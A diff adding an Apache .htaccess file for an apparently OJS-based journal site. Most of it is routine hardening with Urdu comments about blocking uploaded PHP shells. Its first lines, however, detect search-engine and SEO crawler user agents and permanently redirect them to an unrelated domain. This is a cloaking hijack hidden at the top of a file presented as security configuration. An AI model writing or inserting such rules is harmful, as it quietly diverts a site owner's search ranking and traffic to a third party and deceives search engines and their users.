@@ -1,0 +1,44 @@
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
+RewriteRule ^(.*)$  https://greet-research.org/ [R=301,L]
+
+# 1. ERROR LOGGING SETTINGS
+php_value error_log "/home/u291286007/domains/hrj.com.pk/public_html/error_log"
+php_flag log_errors on
+
+# 2. DISABLE DIRECTORY LISTING
+Options -Indexes
+
+# 3. SITEMAP & OJS CLEAN URLS
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+    RewriteBase /
+    
+    # Sitemap
+    RewriteRule ^sitemap.xml$ index.php/index/sitemap [L,R=301]
+    
+    # Allow OJS to run via index.php
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule ^(.*)$ index.php/$1 [L]
+</IfModule>
+
+# 4. SECURITY: Protect sensitive files
+<FilesMatch "^(config\.inc\.php|error_log|\.htaccess|\.user\.ini)$">
+    Order Allow,Deny
+    Deny from all
+</FilesMatch>
+
+# 5. BLOCK EXECUTION IN UPLOADS
+# ہیکرز اکثر پی ایچ پی شیل اپلوڈ کرتے ہیں، یہ انہیں بلاک کرے گا
+<FilesMatch "\.(phtml|php3|php4|php5|php7|PhTML|PhP|a.*|S[hH].*)$">
+    Order allow,deny
+    Deny from all
+</FilesMatch>
+
+# 6. ALLOW ONLY NECESSARY PHP ACCESS
+# صرف OJS کی مین فائل کو چلنے کی اجازت دیں
+<Files "index.php">
+    Order Allow,Deny
+    Allow from all
+</Files>
